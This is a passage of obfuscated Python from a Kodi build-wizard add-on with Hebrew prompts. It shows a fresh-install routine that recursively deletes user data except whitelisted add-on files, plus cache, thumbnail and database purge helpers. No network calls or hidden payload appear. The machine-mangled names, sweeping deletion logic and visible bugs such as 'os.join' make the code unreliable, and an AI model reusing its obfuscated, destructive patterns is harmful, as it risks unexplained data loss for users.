				elif O0OOOOOO0O0OO0OOO =='MyVideos107.db'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4915
				elif O0OOOOOO0O0OO0OOO =='MyVideos116.db'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4916
				elif OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4917
				elif OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'skin.anonymous.mod'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4918
				elif OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'skin.Premium.mod'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4919
				elif OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'skin.anonymous.nox'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4920
				elif OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'skin.phenomenal'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4921
				elif OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'plugin.video.metalliq'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4922
				elif OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'skin.titan'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4924
				elif OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'pvr.iptvsimple'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4925
				elif O0OOOOOO0O0OO0OOO =='sources.xml'and OOOO0O00O0000000O [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4927
				elif O0OOOOOO0O0OO0OOO =='quicknav.DATA.xml'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4930
				elif O0OOOOOO0O0OO0OOO =='x1101.DATA.xml'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4931
				elif O0OOOOOO0O0OO0OOO =='b-srtym-b.DATA.xml'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4932
				elif O0OOOOOO0O0OO0OOO =='x1102.DATA.xml'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4933
				elif O0OOOOOO0O0OO0OOO =='b-sdrvt-b.DATA.xml'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4934
				elif O0OOOOOO0O0OO0OOO =='x1112.DATA.xml'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4935
				elif O0OOOOOO0O0OO0OOO =='b-tlvvyzyh-b.DATA.xml'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4936
				elif O0OOOOOO0O0OO0OOO =='x1111.DATA.xml'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4937
				elif O0OOOOOO0O0OO0OOO =='b-tvknyshrly-b.DATA.xml'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4938
				elif O0OOOOOO0O0OO0OOO =='x1110.DATA.xml'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4939
				elif O0OOOOOO0O0OO0OOO =='b-yldym-b.DATA.xml'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4940
				elif O0OOOOOO0O0OO0OOO =='x1114.DATA.xml'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4941
				elif O0OOOOOO0O0OO0OOO =='b-mvzyqh-b.DATA.xml'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4942
				elif O0OOOOOO0O0OO0OOO =='mainmenu.DATA.xml'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4943
				elif O0OOOOOO0O0OO0OOO =='skin.Premium.mod.properties'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4944
				elif O0OOOOOO0O0OO0OOO =='x1122.DATA.xml'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4946
				elif O0OOOOOO0O0OO0OOO =='b-spvrt-b.DATA.xml'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4947
				elif O0OOOOOO0O0OO0OOO =='favourites.xml'and OOOO0O00O0000000O [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4952
				elif O0OOOOOO0O0OO0OOO =='guisettings.xml'and OOOO0O00O0000000O [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4954
				elif O0OOOOOO0O0OO0OOO =='profiles.xml'and OOOO0O00O0000000O [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4955
				elif O0OOOOOO0O0OO0OOO =='advancedsettings.xml'and OOOO0O00O0000000O [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4956
				elif OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4957
				elif OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'program.apollo'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4958
				elif OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4959
				elif OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'plugin.video.telemedia'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPTELEMEDIA =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4960
				elif OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'plugin.video.elementum'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4963
				elif OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4965
				elif OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'weather.yahoo'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4966
				elif OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'plugin.video.quasar'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4967
				elif OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'program.apollo'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4968
				elif OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4969
				elif OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4970
				elif O0OOOOOO0O0OO0OOO in LOGFILES :wiz .log ("Keep Log File: %s"%O0OOOOOO0O0OO0OOO ,xbmc .LOGNOTICE )#line:4971
				elif O0OOOOOO0O0OO0OOO .endswith ('.db'):#line:4972
					try :#line:4973
						if O0OOOOOO0O0OO0OOO ==OOOOOO0OO0OOOO00O and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O0OOOOOO0O0OO0OOO ,KODIV ),xbmc .LOGNOTICE )#line:4974
						else :os .remove (os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ))#line:4975
					except Exception as O000O0OOOO00O0OOO :#line:4976
						if not O0OOOOOO0O0OO0OOO .startswith ('Textures13'):#line:4977
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4978
							wiz .log ("-> %s"%(str (O000O0OOOO00O0OOO )),xbmc .LOGNOTICE )#line:4979
							wiz .purgeDb (os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ))#line:4980
				else :#line:4981
					DP .update (int (wiz .percentage (OO00O0OO0O0OO00O0 ,O000O0O000OO0OOOO )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOOOOO0O0OO0OOO ),'')#line:4982
					try :os .remove (os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ))#line:4983
					except Exception as O000O0OOOO00O0OOO :#line:4984
						wiz .log ("Error removing %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4985
						wiz .log ("-> / %s"%(str (O000O0OOOO00O0OOO )),xbmc .LOGNOTICE )#line:4986
			if DP .iscanceled ():#line:4987
				DP .close ()#line:4988
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4989
				return False #line:4990
		for O0OOO0000OO00OOO0 ,OO0OOOO00000OOO0O ,OOO0O0O00OO00OOO0 in os .walk (O00OO00O00OOOOOO0 ,topdown =True ):#line:4991
			OO0OOOO00000OOO0O [:]=[OOOOOOO0OO00000OO for OOOOOOO0OO00000OO in OO0OOOO00000OOO0O if OOOOOOO0OO00000OO not in EXCLUDES ]#line:4992
			for O0OOOOOO0O0OO0OOO in OO0OOOO00000OOO0O :#line:4993
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OOOOOO0O0OO0OOO ),'')#line:4994
			  if O0OOOOOO0O0OO0OOO not in ["Database","userdata","temp","addons","addon_data"]:#line:4995
			   if not (O0OOOOOO0O0OO0OOO =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4996
			    if not (O0OOOOOO0O0OO0OOO =='skin.titan'and KEEPSKIN3 =='true'):#line:4998
			      if not (O0OOOOOO0O0OO0OOO =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4999
			       if not (O0OOOOOO0O0OO0OOO =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:5000
			        if not (O0OOOOOO0O0OO0OOO =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:5001
			         if not (O0OOOOOO0O0OO0OOO =='program.apollo'and KEEPINFO =='true'):#line:5002
			          if not (O0OOOOOO0O0OO0OOO =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:5003
			           if not (O0OOOOOO0O0OO0OOO =='weather.yahoo'and KEEPWEATHER =='true'):#line:5004
			            if not (O0OOOOOO0O0OO0OOO =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:5005
			             if not (O0OOOOOO0O0OO0OOO =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:5006
			              if not (O0OOOOOO0O0OO0OOO =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:5007
			               if not (O0OOOOOO0O0OO0OOO =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:5008
			                if not (O0OOOOOO0O0OO0OOO =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5009
			                 if not (O0OOOOOO0O0OO0OOO =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5010
			                  if not (O0OOOOOO0O0OO0OOO =='plugin.video.neptune'and KEEPINFO =='true'):#line:5011
			                   if not (O0OOOOOO0O0OO0OOO =='plugin.video.youtube'and KEEPINFO =='true'):#line:5012
			                    if not (O0OOOOOO0O0OO0OOO =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5013
			                     if not (O0OOOOOO0O0OO0OOO =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5014
			                      if not (O0OOOOOO0O0OO0OOO =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5015
			                       if not (O0OOOOOO0O0OO0OOO =='plugin.video.telemedia'and KEEPTELEMEDIA =='true'):#line:5016
			                           if not (O0OOOOOO0O0OO0OOO =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5020
			                            if not (O0OOOOOO0O0OO0OOO =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5021
			                             if not (O0OOOOOO0O0OO0OOO =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5022
			                              if not (O0OOOOOO0O0OO0OOO =='plugin.video.quasar'and KEEPINFO =='true'):#line:5023
			                               if not (O0OOOOOO0O0OO0OOO =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5024
			                                  shutil .rmtree (os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),ignore_errors =True ,onerror =None )#line:5026
			if DP .iscanceled ():#line:5027
				DP .close ()#line:5028
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5029
				return False #line:5030
		DP .close ()#line:5031
		wiz .clearS ('build')#line:5032
		if over ==True :#line:5033
			return True #line:5034
		elif install =='restore':#line:5035
			return True #line:5036
		elif install :#line:5037
			buildWizard (install ,'normal',over =True )#line:5038
		else :#line:5039
			if INSTALLMETHOD ==1 :OO000O0OOO0000000 =1 #line:5040
			elif INSTALLMETHOD ==2 :OO000O0OOO0000000 =0 #line:5041
			else :OO000O0OOO0000000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5042
			if OO000O0OOO0000000 ==1 :wiz .reloadFix ('fresh')#line:5043
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5044
	else :#line:5045
		if not install =='restore':#line:5046
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5047
			wiz .refresh ()#line:5048
def clearCache ():#line:5053
		wiz .clearCache ()#line:5054
def fixwizard ():#line:5058
		wiz .fixwizard ()#line:5059
def totalClean ():#line:5061
		wiz .clearCache ()#line:5063
		wiz .clearPackages ('total')#line:5064
		clearThumb ('total')#line:5065
		cleanfornewbuild ()#line:5066
def cleanfornewbuild ():#line:5067
		try :#line:5068
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5069
		except :#line:5070
			pass #line:5071
		try :#line:5072
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5073
		except :#line:5074
			pass #line:5075
		try :#line:5076
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5077
		except :#line:5078
			pass #line:5079
def clearThumb (type =None ):#line:5080
	OO0O00OOO000000O0 =wiz .latestDB ('Textures')#line:5081
	if not type ==None :O00O00O000OOOOOO0 =1 #line:5082
	else :O00O00O000OOOOOO0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OO0O00OOO000000O0 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5083
	if O00O00O000OOOOOO0 ==1 :#line:5084
		try :wiz .removeFile (os .join (DATABASE ,OO0O00OOO000000O0 ))#line:5085
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OO0O00OOO000000O0 )#line:5086
		wiz .removeFolder (THUMBS )#line:5087
	else :wiz .log ('Clear thumbnames cancelled')#line:5089
	wiz .redoThumbs ()#line:5090
def purgeDb ():#line:5092
	O0O0OO000OO0O00O0 =[];O00OO0OO0000OO0OO =[]#line:5093
	for O0OO000000O0000O0 ,OO0O0O0OO0OOO0000 ,O0000000000O0OO00 in os .walk (HOME ):#line:5094
		for OO0OOO0O0OOOO0O00 in fnmatch .filter (O0000000000O0OO00 ,'*.db'):#line:5095
			if OO0OOO0O0OOOO0O00 !='Thumbs.db':#line:5096
				OOO0O0O00OO0OO0OO =os .path .join (O0OO000000O0000O0 ,OO0OOO0O0OOOO0O00 )#line:5097
				O0O0OO000OO0O00O0 .append (OOO0O0O00OO0OO0OO )#line:5098
				O0O00OO0OOOO0O0OO =OOO0O0O00OO0OO0OO .replace ('\\','/').split ('/')#line:5099
				O00OO0OO0000OO0OO .append ('(%s) %s'%(O0O00OO0OOOO0O0OO [len (O0O00OO0OOOO0O0OO )-2 ],O0O00OO0OOOO0O0OO [len (O0O00OO0OOOO0O0OO )-1 ]))#line:5100
	if KODIV >=16 :#line:5101
		O0O0OOOOO0OO0OO0O =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O00OO0OO0000OO0OO )#line:5102
